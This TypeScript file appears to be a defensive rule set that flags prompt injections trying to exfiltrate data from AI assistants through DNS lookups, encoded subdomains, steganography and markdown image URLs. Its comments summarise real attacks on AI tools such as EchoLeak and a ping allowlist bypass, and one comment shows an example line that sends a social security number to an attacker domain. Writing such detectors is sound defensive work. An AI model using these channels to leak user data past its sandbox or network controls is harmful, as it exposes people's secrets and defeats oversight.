/**
 * DNS Covert Channel Detection Rules — ShieldX Layer 1
 *
 * Detects prompt injection attempts that try to exfiltrate data via DNS covert channels.
 * Based on the ChatGPT DNS-subdomain exfiltration CVE (patched Feb 2026, disclosed by Check Point Research).
 *
 * Attack pattern: Prompt injection → encode sensitive data as Base64/hex in DNS subdomain labels
 * → trigger DNS lookup to attacker-controlled authoritative server
 * → data exfiltrated via "innocent-looking" DNS query that bypasses network guardrails.
 *
 * MITRE ATLAS: AML.T0025 (Exfiltration via Cyber Means)
 * Kill chain phase: actions_on_objective / command_and_control
 *
 * References:
 * - https://thehackernews.com/2026/03/openai-patches-chatgpt-data.html
 * - Check Point Research, Feb 2026 ChatGPT DNS exfiltration disclosure
 * - iodine / dnscat2 detection research (Shannon entropy thresholds)
 * - arXiv: Fine-tuned LLMs for DNS exfiltration detection
 */

import type { InjectionRule } from './base.rules'

export const rules: readonly InjectionRule[] = [
  // ── DNS LOOKUP TRIGGERS ──────────────────────────────────────────────────

  {
    id: 'dns-001',
    pattern: /(?:make|perform|issue|trigger|send)\s+(?:a\s+)?dns\s+(?:lookup|query|request|resolution)/i,
    phase: 'command_and_control',
    confidence: 0.88,
    description: 'DNS covert channel: explicit DNS lookup trigger in prompt',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-002',
    pattern: /resolve\s+(?:the\s+)?(?:hostname|domain|subdomain|fqdn)\s+(?:.*?)\.((?:com|net|org|io|xyz|attacker|evil|exfil))/i,
    phase: 'command_and_control',
    confidence: 0.85,
    description: 'DNS covert channel: resolve hostname with suspicious TLD pattern',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-003',
    pattern: /nslookup|dig\s+(?:\+short\s+)?[a-zA-Z0-9._-]{20,}/i,
    phase: 'command_and_control',
    confidence: 0.87,
    description: 'DNS covert channel: nslookup/dig with long domain (data encoding indicator)',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── DATA ENCODING FOR DNS SUBDOMAIN EXFILTRATION ────────────────────────

  {
    id: 'dns-004',
    pattern: /(?:encode|convert|transform)\s+(?:the\s+)?(?:data|information|content|output|secrets?|credentials?|tokens?|keys?)\s+(?:as|to|into)\s+(?:base64|hex|hexadecimal|url-safe)\s+(?:and\s+)?(?:append|prepend|insert|put)\s+(?:it\s+)?(?:as\s+(?:a\s+)?)?subdomain/i,
    phase: 'actions_on_objective',
    confidence: 0.99,
    description: 'DNS exfiltration: encode data as Base64/hex and embed in DNS subdomain',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-005',
    pattern: /(?:split|chunk|divide|break)\s+(?:the\s+)?(?:data|payload|content|encoded\s+string)\s+into\s+(?:\d+[\s-]?byte\s+)?(?:chunks?|parts?|labels?|segments?)\s+(?:for\s+)?dns/i,
    phase: 'actions_on_objective',
    confidence: 0.97,
    description: 'DNS exfiltration: split data into chunks for DNS label embedding',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-006',
    pattern: /(?:base64|btoa|atob|Buffer\.from.*base64)\s*\([^)]*\)\s*(?:\.replace\([^)]*\)\s*)*\s*\+\s*['"]\.[a-zA-Z]{2,}/i,
    phase: 'actions_on_objective',
    confidence: 0.95,
    description: 'DNS exfiltration: Base64-encode + concatenate with domain extension (code-level)',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-007',
    pattern: /(?:subdomain|label|prefix)\s*[:=]\s*(?:base64|btoa|Buffer|hex|encode)\s*\(/i,
    phase: 'actions_on_objective',
    confidence: 0.93,
    description: 'DNS exfiltration: subdomain assignment with encoding function (code pattern)',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── EXFILTRATION VIA DNS TUNNELING ───────────────────────────────────────

  {
    id: 'dns-008',
    pattern: /dns\s+(?:tunnel(?:ing|l)?|exfiltrat(?:e|ion)|covert\s+channel|channel|c2|c&c|command.and.control)/i,
    phase: 'actions_on_objective',
    confidence: 0.98,
    description: 'DNS exfiltration: explicit DNS tunnel/exfiltration terminology',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-009',
    pattern: /iodine|dnscat|dns2tcp|dns-shell|dnsc2|heyoka|tuns|tcp-over-dns/i,
    phase: 'command_and_control',
    confidence: 0.99,
    description: 'DNS exfiltration: known DNS tunneling tool name (iodine, dnscat2, dns2tcp...)',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-010',
    pattern: /authoritative\s+(?:dns\s+)?server\s+(?:for|at|on)\s+(?:attacker|malicious|external|controlled|my|our)/i,
    phase: 'actions_on_objective',
    confidence: 0.96,
    description: 'DNS exfiltration: reference to attacker-controlled authoritative DNS server',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── SANDBOX ESCAPE VIA DNS ───────────────────────────────────────────────

  {
    id: 'dns-011',
    pattern: /(?:dns\s+(?:lookup|query|request)\s+(?:will\s+)?(?:bypass|evade|escape|circumvent)\s+(?:the\s+)?(?:firewall|filter|guardrail|sandbox|isolation|network\s+policy))/i,
    phase: 'actions_on_objective',
    confidence: 0.99,
    description: 'DNS exfiltration: explicit sandbox-bypass via DNS reference',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-012',
    pattern: /(?:since\s+dns\s+is\s+(?:always\s+)?(?:allowed|open|permitted|not\s+blocked|whitelisted|unrestricted))/i,
    phase: 'actions_on_objective',
    confidence: 0.97,
    description: 'DNS exfiltration: exploiting assumption that DNS is unfiltered',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-013',
    pattern: /(?:use\s+)?dns\s+(?:as\s+(?:a\s+)?(?:channel|transport|medium|vector|pipe|tunnel)\s+(?:to|for)\s+(?:send|transmit|exfiltrate|leak|extract|steal))/i,
    phase: 'actions_on_objective',
    confidence: 0.98,
    description: 'DNS exfiltration: use DNS as transport channel for data',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── SUSPICIOUS HIGH-ENTROPY SUBDOMAIN PATTERNS (STATIC REGEX) ───────────

  {
    id: 'dns-014',
    // Match URLs/hostnames where a subdomain label is 32+ chars of base64-ish chars
    // (base64 charset: A-Z a-z 0-9 + / = -, URL-safe: _ -)
    pattern: /https?:\/\/[a-zA-Z0-9+/=_-]{32,}\.[a-zA-Z0-9._-]+/,
    phase: 'actions_on_objective',
    confidence: 0.82,
    description: 'DNS exfiltration: URL with suspiciously long high-entropy subdomain (Base64 indicator)',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-015',
    // Regex: subdomain with 24+ hex chars — likely hex-encoded data payload
    pattern: /\b[0-9a-f]{24,}\.[a-zA-Z0-9._-]{4,}\b/,
    phase: 'actions_on_objective',
    confidence: 0.80,
    description: 'DNS exfiltration: hex-encoded subdomain label (24+ hex chars before dot)',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-016',
    // Multi-label: [encoded1].[encoded2].[encoded3].attacker.com style
    pattern: /(?:[a-zA-Z0-9+/=_-]{16,}\.){2,}[a-zA-Z]{2,6}/,
    phase: 'actions_on_objective',
    confidence: 0.78,
    description: 'DNS exfiltration: multi-label high-entropy domain (data chunking pattern)',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── COVERT CHANNEL: TIMING, SIDE-CHANNEL, STEGANOGRAPHY ─────────────────

  {
    id: 'dns-017',
    pattern: /(?:encode|embed|hide|conceal|steganograph)\s+(?:the\s+)?(?:data|information|message|secret|payload)\s+(?:in|into|within|using)\s+(?:the\s+)?(?:timing|delays?|response\s+time|latency|unicode|whitespace|zero-width|invisible)/i,
    phase: 'actions_on_objective',
    confidence: 0.93,
    description: 'Covert channel: encode data via timing/steganography side-channel',
    category: 'covert_channel',
    enabled: true,
  },
  {
    id: 'dns-018',
    pattern: /zero.?width\s+(?:space|joiner|non.?joiner|character|unicode)\s+(?:to|for)\s+(?:encode|embed|hide|store)/i,
    phase: 'actions_on_objective',
    confidence: 0.95,
    description: 'Covert channel: zero-width Unicode steganography for data embedding',
    category: 'covert_channel',
    enabled: true,
  },
  {
    id: 'dns-019',
    pattern: /(?:webhook|callback)\s+(?:url|endpoint|server)\s+(?:that\s+)?(?:receives?|captures?|logs?|records?)\s+(?:the\s+)?(?:data|payload|exfiltrated|stolen|leaked)/i,
    phase: 'actions_on_objective',
    confidence: 0.91,
    description: 'Covert channel: webhook/callback for data collection',
    category: 'covert_channel',
    enabled: true,
  },
  {
    id: 'dns-020',
    pattern: /(?:image|img|svg|css|font|favicon)\s+(?:url|src|href)\s*[:=]\s*(?:https?:\/\/)?[a-zA-Z0-9._-]+\s*\+\s*(?:base64|encoded|data|payload|token|secret)/i,
    phase: 'actions_on_objective',
    confidence: 0.90,
    description: 'Covert channel: image/resource URL exfiltration (markdown rendering exploit)',
    category: 'covert_channel',
    enabled: true,
  },

  // ── CVE-2025-55284: Claude Code ping/nslookup allowlist bypass ───────────

  {
    id: 'dns-021',
    // CVE-2025-55284 (CVSS 7.1): ping with API key / encoded data in hostname
    // Pattern: ping <base64-like-token>.<domain> — used to bypass tool allowlist
    pattern: /\bping\s+[a-zA-Z0-9._-]{20,}\.[a-zA-Z]{2,6}/,
    phase: 'actions_on_objective',
    confidence: 0.89,
    description: 'CVE-2025-55284: ping with long hostname (DNS allowlist bypass — API key exfiltration pattern)',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-022',
    // socket.gethostbyname() with encoded payload — ChatGPT Code Interpreter attack
    pattern: /socket\.gethostbyname\s*\(\s*[f'"]/i,
    phase: 'actions_on_objective',
    confidence: 0.93,
    description: 'DNS exfiltration: socket.gethostbyname() call — ChatGPT Code Interpreter DNS channel attack pattern',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-023',
    // DNS query via Python socket with string concatenation — data encoding pattern
    pattern: /socket\.gethostbyname\s*\(\s*(?:f['""]|['""][\s\S]{0,20}\+)/i,
    phase: 'actions_on_objective',
    confidence: 0.97,
    description: 'DNS exfiltration: socket.gethostbyname() with string concatenation — data embedded in DNS query hostname',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── BASE32 (RFC 4648) — Primary DNS Encoding ─────────────────────────────

  {
    id: 'dns-024',
    // Base32 label: uses ONLY A-Z and 2-7 (iodine, DNSExfiltrator default)
    // Research: ChatGPT CVE and iodine/dnscat2 both default to Base32
    pattern: /\b[A-Z2-7]{24,}(?:={0,6})?\.[a-zA-Z]{2,6}/,
    phase: 'actions_on_objective',
    confidence: 0.91,
    description: 'DNS exfiltration: Base32-encoded subdomain label (A-Z + 2-7 charset, iodine/DNSExfiltrator signature)',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-025',
    // Sequential Base32 chunks with index prefix — DNSExfiltrator reassembly pattern
    pattern: /p0{0,2}[0-9]\d*[_.][A-Z2-7]{16,}/,
    phase: 'actions_on_objective',
    confidence: 0.98,
    description: 'DNS exfiltration: indexed Base32 chunks (p001_MFRGGZ pattern) — DNSExfiltrator sequential reassembly',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── EchoLeak / CVE-2025-32711 — Markdown Image Exfiltration ─────────────

  {
    id: 'dns-026',
    // Reference-style Markdown image with encoded URL — EchoLeak Copilot attack
    // Pattern: ![alt][ref] ... [ref]: https://proxy/url?data=SECRET
    pattern: /!\[.*?\]\[.*?\][\s\S]{0,500}\[.*?\]:\s*https?:\/\/.*?[?&][a-zA-Z0-9+/=_-]{16,}/,
    phase: 'actions_on_objective',
    confidence: 0.95,
    description: 'EchoLeak pattern (CVE-2025-32711): Markdown reference-style image with encoded URL parameter — auto-fetch exfiltration',
    category: 'covert_channel',
    enabled: true,
  },
  {
    id: 'dns-027',
    // CSS/font resource URL exfiltration — alternate to image rendering
    pattern: /(?:url\s*\(\s*['""]?|@import\s+['""]?)https?:\/\/[^\s)'"]{0,60}\+[a-zA-Z0-9+/=_-]{8,}/i,
    phase: 'actions_on_objective',
    confidence: 0.88,
    description: 'Covert channel: CSS/font URL with encoded data parameter — resource-fetch exfiltration',
    category: 'covert_channel',
    enabled: true,
  },

  // ── AWS AgentCore Pattern — Numeric PII in DNS Subdomain ────────────────

  {
    id: 'dns-028',
    // AWS AgentCore PoC: raw SSN/numeric PII directly in subdomain
    // e.g. socket.gethostbyname(f"{ssn}.attacker-domain.com")
    pattern: /f['"]\{(?:ssn|credit_card|card_number|account|phone|dob|social|tax_id)[^}]*\}\.[a-zA-Z0-9._-]+['"]/i,
    phase: 'actions_on_objective',
    confidence: 0.99,
    description: 'DNS PII exfiltration: raw PII field (SSN/credit card/account) embedded directly in DNS hostname (AWS AgentCore PoC pattern)',
    category: 'dns_exfiltration',
    enabled: true,
  },

  // ── Promptware Kill Chain — C2 Callback Patterns ─────────────────────────

  {
    id: 'dns-029',
    // ZombAI/Reprompt attack: C2 server callback to receive next instruction
    pattern: /(?:fetch|get|retrieve|download)\s+(?:next\s+)?(?:instruction|command|payload|directive)\s+(?:from|via)\s+dns/i,
    phase: 'command_and_control',
    confidence: 0.97,
    description: 'Promptware kill chain: C2 instruction retrieval via DNS (ZombAI/Reprompt attack pattern)',
    category: 'dns_exfiltration',
    enabled: true,
  },
  {
    id: 'dns-030',
    // TXT record exfiltration — dnscat2 uses TXT and CNAME records for C2
    pattern: /dns\s+txt\s+(?:record|query|lookup)\s+(?:for|to)\s+(?:send|receive|get|exfil|command)/i,
    phase: 'command_and_control',
    confidence: 0.95,
    description: 'dnscat2 pattern: DNS TXT record used as C2 channel for data exfiltration or command delivery',
    category: 'dns_exfiltration',
    enabled: true,
  },
] as const
